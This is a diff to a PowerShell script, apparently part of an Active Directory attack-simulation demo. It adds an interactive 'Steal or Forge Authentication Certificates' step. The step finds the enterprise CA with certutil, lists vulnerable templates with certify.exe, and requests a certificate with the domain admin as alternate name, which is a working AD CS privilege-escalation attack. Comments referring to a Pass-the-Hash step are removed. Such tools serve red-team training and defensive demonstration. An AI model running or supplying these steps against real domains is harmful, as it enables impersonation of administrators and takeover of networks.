@@ -2475,14 +2475,72 @@ $answer   = Get-Answer -question $question -defaultValue $No
 If ($answer -eq $yes)
 
 {
-    Invoke-Command -ScriptBlock {certutil}
-    $PemToPFXFile  = FindVulnerableCATemplates -altname $domainadmin
-    
-    #Starting Pass-the-Hash (PtH) Attack on VictimPC
-    #Show-Step -step step_007_PtH.html  
-    #Start-PtH-Attack
+write-log -Message "Start Attack Level - Steal or Forge Authentication Certificates"
+
+$CAtemplate = "AS2Go"
+$altname =    $domainadmin
+$pemFile =    ".\$altname.pem"   
+
+Write-Host "Step 1 - Get the Enterprise CA name" -ForegroundColor $global:FGCHighLight
+#get the Enterprise CA name
+Invoke-Command -ScriptBlock {certutil}
+Write-Host ""
+$MyCAConfig = Invoke-Command -ScriptBlock {certutil}
+$temp = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027)
+$myEntCA = $temp[1]
+Write-Host $myEntCA -ForegroundColor $global:FGCHighLight
+pause
+clear
+
+Write-Host "Step 2 - Finding Vulnerable Certificate Templates " -ForegroundColor $global:FGCHighLight -NoNewline
+Write-host "- certify.exe find /vulnerable" -ForegroundColor $global:FGCCommand
+pause
+#find vulnerable CA templates
+Invoke-Command -ScriptBlock {.\certify.exe find /vulnerable}
+
+Write-Host "`nFound Vulnerable Certificate Templates - $CAtemplate" -ForegroundColor Yellow
+Write-host "Do you want to use this CA template?" -ForegroundColor $global:FGCCommand
+pause 
+#get the Enterprise CA name
+$result = certutil -config $myEntCA -ping
+
+$text = "copy the certificate content printed out by certify and paste it into this file"
 
 
+Write-Host "Step 2 - Requesting Certificate with Certify" -ForegroundColor $global:FGCHighLight
+Write-host "Do you want to use this CA template - $CAtemplate " -ForegroundColor Yellow
+
+pause
+
+
+if (!(Test-Path $pemFile))
+{
+  New-Item -path . -name $pemFile -type "file" -value $text
+}
+else
+{
+  Set-Content -path $pemFile -value $text
+}
+
+# more content to this file
+Add-Content -path $pemFile -value "Save this file"
+Add-Content -path $pemFile -value "Please remove this lines before"
+
+
+#Request a Certificates
+If ($result[2].ToLower().Contains("successfully") -eq $True)
+{
+   Invoke-Command -ScriptBlock {.\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname}
+   Invoke-Command -ScriptBlock {notepad $pemFile}
+   Write-Log -Message "The certificate retrieved is in a PEM format - $pemFile"
+}
+else
+{
+   Write-Host $result[1] -ForegroundColor red
+   Write-Host $result[3]
+   Write-Host $result[4]
+}
+pause
 
 }
 
